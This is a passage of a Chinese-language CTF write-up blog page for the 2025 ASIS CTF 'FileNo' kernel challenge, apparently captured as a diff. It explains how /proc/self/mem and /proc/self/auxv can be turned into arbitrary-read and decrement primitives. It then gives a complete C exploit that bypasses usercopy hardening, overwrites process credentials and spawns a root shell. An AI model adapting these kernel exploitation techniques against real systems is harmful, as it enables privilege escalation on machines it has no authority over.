kernel_base);<br>			<span class="hljs-keyword">break</span>;<br>		&#125;<br>	&#125;<br><br>	<span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>; i&lt;N_PAGES; i++)&#123;<br>		read(pipe_fd[i][<span class="hljs-number">0</span>], buffer, <span class="hljs-keyword">sizeof</span>(buffer));<br>	&#125;<br><br>	<span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">0x22</span>; i++)&#123;<br>		<span class="hljs-keyword">if</span>((sprays[N_PAGE_NUM<span class="hljs-number">-3</span>][i].addr &amp; <span class="hljs-number">0xfff</span>) != <span class="hljs-number">0</span>)&#123;<br>			<span class="hljs-keyword">continue</span>;<br>		&#125;<span class="hljs-keyword">else</span>&#123;<br>			<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Find target %lx.\n&quot;</span>, sprays[N_PAGE_NUM<span class="hljs-number">-3</span>][i].addr);<br>			hack(sprays[N_PAGE_NUM<span class="hljs-number">-3</span>][i].addr);<br>			read(sprays[N_PAGE_NUM<span class="hljs-number">-3</span>][i].fd, &amp;kernel_base, <span class="hljs-number">8</span>);<br>			<span class="hljs-keyword">break</span>;<br>		&#125;	<br>	&#125;<br><br>	<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<h1 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h1><p><em><strong>幽天帝！\(^o^)&#x2F; 幽天帝！\(^o^)&#x2F; 幽天帝！\(^o^)&#x2F;</strong></em></p>
+<h2 id="proc"><a href="#proc" class="headerlink" title="proc"></a>proc</h2><p><code>/proc/self</code>下其实还有其他能用的文件：</p>
+<ul>
+<li><code>/proc/self/mem</code>：进程虚拟内存读写</li>
+<li><code>/proc/self/auxv</code>：读进程辅助向量</li>
+</ul>
+<p>这两个文件<code>file-&gt;private_data</code>都指向进程的mm_struct</p>
+<ul>
+<li><p>读<code>/proc/self/auxv</code>等同于读mm_struct的某块内存</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mm_struct</span> &#123;</span><br>    <span class="hljs-comment">// ……</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> saved_auxv[AT_VECTOR_SIZE]; <span class="hljs-comment">/* for /proc/PID/auxv */</span><br>    <span class="hljs-comment">// ……</span><br>&#125;<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>close一个<code>/proc/self/mem</code>会调用mmdrop，也就是mm_count-1</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mm_struct</span> &#123;</span><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>		<span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>			<span class="hljs-type">atomic_t</span> mm_count;<br>		&#125; ____cacheline_aligned_in_smp;<br>        <span class="hljs-comment">// ……</span><br></code></pre></td></tr></table></figure></li>
+</ul>
+<p>由于可以随便改file-&gt;private_data，所以通过close一个<code>/proc/self/mem</code>可以获得任意地址内容-1原语，通过读<code>/proc/self/auxv</code>可以获得任意读原语</p>
+<p>由于开启了usercopy保护，实际上不能进行堆上任意的读写，可以通过-1原语更改kmem_cache-&gt;useroffset和kmem_cache-&gt;usersize进行一个绕过</p>
+<h2 id="Exp-1"><a href="#Exp-1" class="headerlink" title="Exp"></a>Exp</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;mykernel.h&quot;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CMD_READ    0x1337</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CMD_WRITE   0x1338</span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>  	<span class="hljs-type">int</span> fd;<br>  	<span class="hljs-type">long</span> val;<br>&#125; <span class="hljs-type">req_t</span>;<br><br><br><span class="hljs-type">size_t</span> <span class="hljs-title function_">dev_read</span><span class="hljs-params">(<span class="hljs-type">int</span> fd_dev, <span class="hljs-type">int</span> fd)</span>&#123;<br>	<span class="hljs-type">req_t</span> arg = &#123;<br>		.fd = fd,<br>		.val = <span class="hljs-number">0</span>,<br>	&#125;;<br>	ioctl(fd_dev, CMD_READ, &amp;arg);<br>	<span class="hljs-keyword">return</span> arg.val;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">dev_write</span><span class="hljs-params">(<span class="hljs-type">int</span> fd_dev, <span class="hljs-type">int</span> fd, <span class="hljs-type">size_t</span> val)</span>&#123;<br>	<span class="hljs-type">req_t</span> arg = &#123;<br>		.fd = fd,<br>		.val = val,<br>	&#125;;<br>	<span class="hljs-keyword">return</span> ioctl(fd_dev, CMD_WRITE, &amp;arg);<br>&#125;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fd_addr</span> &#123;</span><br>	<span class="hljs-type">int</span> fd;<br>	<span class="hljs-type">size_t</span> addr;<br>&#125; object;<br><br><span class="hljs-type">char</span> buffer[<span class="hljs-number">0x1000</span>];<br><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">arbitary_read_offset</span><span class="hljs-params">(<span class="hljs-type">int</span> fd_dev, <span class="hljs-type">int</span> fd_auxv, <span class="hljs-type">size_t</span> addr, <span class="hljs-type">size_t</span> offset)</span> &#123;<br>	dev_write(fd_dev, fd_auxv, addr<span class="hljs-number">-0x198</span>+offset);<br>	lseek(fd_auxv, <span class="hljs-number">0</span>, SEEK_SET);<br>	read(fd_auxv, buffer+offset, <span class="hljs-number">0x100</span>);<br>&#125;<br><br><span class="hljs-type">size_t</span> <span class="hljs-title function_">arbitary_read</span><span class="hljs-params">(<span class="hljs-type">int</span> fd_dev, <span class="hljs-type">int</span> fd_auxv, <span class="hljs-type">size_t</span> addr)</span> &#123;<br>	dev_write(fd_dev, fd_auxv, addr<span class="hljs-number">-0x198</span>);<br>	lseek(fd_auxv, <span class="hljs-number">0</span>, SEEK_SET);<br>	read(fd_auxv, buffer, <span class="hljs-number">0x1000</span>);<br>	<span class="hljs-keyword">return</span> *(<span class="hljs-type">size_t</span> *)buffer;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">arbitary_sub1</span><span class="hljs-params">(<span class="hljs-type">int</span> fd_dev, <span class="hljs-type">size_t</span> addr)</span> &#123;<br>	<span class="hljs-type">int</span> fd_mem = open(<span class="hljs-string">&quot;/proc/self/mem&quot;</span>, O_RDWR);<br>	dev_write(fd_dev, fd_mem, addr);<br>	close(fd_mem);<br>&#125;<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> N_FD_MEM 0x300</span><br><span class="hljs-type">int</span> fd_mems[N_FD_MEM];<br><span class="hljs-type">int</span> fd_idx = <span class="hljs-number">0</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">prepare_fds</span><span class="hljs-params">()</span> &#123;<br>	<span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;N_FD_MEM; i++) &#123;<br>		fd_mems[i] = open(<span class="hljs-string">&quot;/proc/self/mem&quot;</span>, O_RDWR);<br>		<span class="hljs-keyword">if</span>(fd_mems[i]&lt;<span class="hljs-number">0</span>) &#123;<br>			<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;open /proc/self/mem failed at %d\n&quot;</span>, i);<br>			<span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>		&#125;<br>	&#125;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">arbitary_subn</span><span class="hljs-params">(<span class="hljs-type">int</span> fd_dev, <span class="hljs-type">size_t</span> addr, <span class="hljs-type">int</span> n)</span> &#123;<br>	<span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;n; i++)&#123;<br>		dev_write(fd_dev, fd_mems[fd_idx], addr);<br>		close(fd_mems[fd_idx]);<br>		fd_idx++;<br>	&#125;<br>&#125;<br><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>	save_status();<br>	bind_core(<span class="hljs-number">0</span>);<br><br>	<span class="hljs-type">int</span> fd = open(<span class="hljs-string">&quot;/dev/vuln&quot;</span>, O_RDWR);<br><br>	<span class="hljs-type">int</span> fd_auxv = open(<span class="hljs-string">&quot;/proc/self/auxv&quot;</span>, O_RDONLY);<br><br>	<span class="hljs-type">size_t</span> heap_addr = dev_read(fd, fd_auxv);<br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;heap_addr: %lx\n&quot;</span>, heap_addr);<br><br>	kernel_base = arbitary_read(fd, fd_auxv, (heap_addr&amp;<span class="hljs-number">0xfffffffff0000000</span>)+<span class="hljs-number">0x9d000</span>)<span class="hljs-number">-0x22bf70</span>;<br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;kernel_base: %lx\n&quot;</span>, kernel_base);<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> INIT_TASK 			0xe0c480</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> TASK_STRUCT_CACHE	0x10eeb98</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CRED_CACHE			0x10efaf0</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> TASKS_OFFSET		0x320</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> COMM_OFFSET			0x5d0</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> USEROFFSET_OFFSET	0xc8</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> USERSIZE_OFFSET		0xcc</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CRED_OFFSET			0x5c8</span><br><br>	<span class="hljs-type">size_t</span> task_struct_cache = arbitary_read(fd, fd_auxv, kernel_base+TASK_STRUCT_CACHE);<br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;task_struct_cache: %lx\n&quot;</span>, task_struct_cache);<br><br>	<span class="hljs-type">size_t</span> cred_cache = arbitary_read(fd, fd_auxv, kernel_base+CRED_CACHE);<br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;cred_cache: %lx\n&quot;</span>, cred_cache);<br><br>	<span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">0xa40</span><span class="hljs-number">-0x320</span>; i++)<br>		arbitary_sub1(fd, task_struct_cache+USEROFFSET_OFFSET);<br>	arbitary_sub1(fd, task_struct_cache+USERSIZE_OFFSET+<span class="hljs-number">2</span>);<br><br>	arbitary_sub1(fd, cred_cache+USERSIZE_OFFSET);<br><br>	<span class="hljs-type">size_t</span> next_task = kernel_base+INIT_TASK;<br>	<span class="hljs-keyword">do</span> &#123;<br>		next_task = arbitary_read(fd, fd_auxv, next_task+TASKS_OFFSET+<span class="hljs-number">8</span>)-TASKS_OFFSET;<br>		<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;next_task: %lx\n&quot;</span>, next_task);<br>		arbitary_read(fd, fd_auxv, next_task+COMM_OFFSET);<br>		<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;task_struct-&gt;comm: %s\n&quot;</span>, buffer);<br><br>	&#125; <span class="hljs-keyword">while</span>(<span class="hljs-built_in">strncmp</span>(buffer, <span class="hljs-string">&quot;exploit&quot;</span>, <span class="hljs-number">7</span>));<br><br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Got it %lx!\n&quot;</span>, next_task);<br>	<span class="hljs-type">size_t</span> cred = arbitary_read(fd, fd_auxv, next_task+CRED_OFFSET);<br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;cred: %lx\n&quot;</span>, cred);<br><br>	arbitary_read(fd, fd_auxv, cred+<span class="hljs-number">8</span>);<br>	prepare_fds();<br>	<span class="hljs-type">uint8_t</span> *ptr = buffer;<br>	<span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">0x20</span>; i++) &#123;<br>		<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;round %d\n&quot;</span>, i);<br>		hex_dump(ptr, <span class="hljs-number">0x20</span>);<br>		<span class="hljs-keyword">if</span> ((*((<span class="hljs-type">uint32_t</span> *)(&amp;ptr[i]))&amp;<span class="hljs-number">0xffffff00</span>) == <span class="hljs-number">0</span>) &#123;<br>			arbitary_subn(fd, cred+<span class="hljs-number">8</span>+i+<span class="hljs-number">3</span>, <span class="hljs-number">1</span>);<br>			arbitary_read_offset(fd, fd_auxv, cred+<span class="hljs-number">8</span>, i);<br>		&#125;<br>		arbitary_subn(fd, cred+<span class="hljs-number">8</span>+i, ptr[i]);<br>		<br>		arbitary_read_offset(fd, fd_auxv, cred+<span class="hljs-number">8</span>, i);<br>	&#125;<br><br>	system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br><br>	sleep(<span class="hljs-number">10000</span>);<br><br>	<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/Kernel/" class="category-chain-item">Kernel</a>
+  
+  
+    <span>></span>
+    
+  <a href="/categories/Kernel/WP/" class="category-chain-item">WP</a>
+  
+  
+
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/wp/" class="print-no-link">#wp</a>
+      
+        <a href="/tags/kernel/" class="print-no-link">#kernel</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>2025 ASIS CTF FileNo</div>
+      <div>http://akaieurus.github.io/2025/09/18/asis2025fileno/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Eurus</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2025年9月18日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2025/09/13/asis2025qjs/" title="2025 ASIS CTF RandomJS wp">
+                        <span class="hidden-mobile">2025 ASIS CTF RandomJS wp</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
